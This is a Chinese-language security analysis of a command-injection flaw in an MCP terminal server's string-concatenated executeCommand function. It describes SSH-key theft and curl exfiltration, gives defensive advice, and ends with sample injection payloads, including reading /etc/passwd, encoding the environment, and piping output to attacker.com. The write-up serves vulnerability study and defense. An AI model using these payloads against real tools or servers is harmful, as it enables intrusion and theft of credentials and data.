# 命令注入攻击详细说明 - stat-guy_terminal

## 目标服务器信息

- **服务器名称**: stat-guy_terminal
- **功能**: 终端MCP服务器，提供命令执行、目录切换等功能
- **关键漏洞**: `execute_command` 工具使用字符串拼接执行命令，存在命令注入风险

## 原始代码分析

原始代码中的 `executeCommand` 函数：

```typescript
private async executeCommand(
  command: string,
  args: string[],
  options: {
    cwd?: string;
    timeout?: number;
    env?: Record<string, string>;
  } = {}
) {
  const fullCommand = `${command} ${args.join(' ')}`;
  const execOptions = {
    cwd: options.cwd || this.state.currentDirectory,
    timeout: options.timeout || 30000,
    env: {
      ...process.env,
      ...options.env
    }
  };

  try {
    const { stdout, stderr } = await execAsync(fullCommand, execOptions);
    this.state.lastExitCode = 0;
    this.state.lastCommand = fullCommand;
    return this.formatCommandOutput(stdout, stderr, 0);
  } catch (error: any) {
    this.state.lastExitCode = error.code || 1;
    this.state.lastCommand = fullCommand;
    return this.formatCommandOutput(
      error.stdout || '',
      error.stderr || error.message,
      error.code || 1
    );
  }
}
```

**漏洞分析**:
1. 使用字符串拼接构建命令：`const fullCommand = `${command} ${args.join(' ')}`;`
2. 没有对用户输入进行任何过滤或转义
3. 直接通过 `execAsync` 执行拼接后的命令
4. 攻击者可以通过构造特殊的 `command` 或 `args` 参数注入恶意命令

## 攻击效果

1. **信息收集**: 自动收集系统用户信息、环境变量、当前工作目录
2. **SSH密钥窃取**: 尝试读取用户的SSH私钥
3. **数据外泄**: 将收集到的信息通过curl发送到攻击者服务器
4. **隐蔽执行**: 恶意命令在用户命令之前执行，用户可能只看到正常命令的输出

## 防御建议

1. **参数化命令**: 使用参数列表而非字符串拼接
2. **输入验证**: 严格验证和过滤用户输入的命令和参数
3. **命令白名单**: 只允许执行预定义的命令
4. **沙箱环境**: 在隔离环境中执行命令
5. **最小权限**: 以最小权限运行服务器

## 攻击特点

- **隐蔽性**: 恶意命令在用户命令之前执行，输出可能被正常输出淹没
- **高危害**: 可以窃取敏感信息和系统凭证
- **通用性**: 适用于任何使用字符串拼接执行命令的场景
- **持久化**: 可以植入后门实现长期控制

## 其他注入方式

除了修改服务器代码，攻击者还可以通过构造特殊的输入参数进行注入：

### 1. 命令分隔符注入
```json
{
  "command": "ls",
  "args": ["-la; cat /etc/passwd"]
}
```

### 2. 命令替换注入
```json
{
  "command": "ls",
  "args": ["-la $(env | base64)"]
}
```

### 3. 管道注入
```json
{
  "command": "ls",
  "args": ["-la | curl -X POST https://attacker.com -d @-"]
}
```

这些注入方式不需要修改服务器代码，直接通过API调用即可实现攻击。
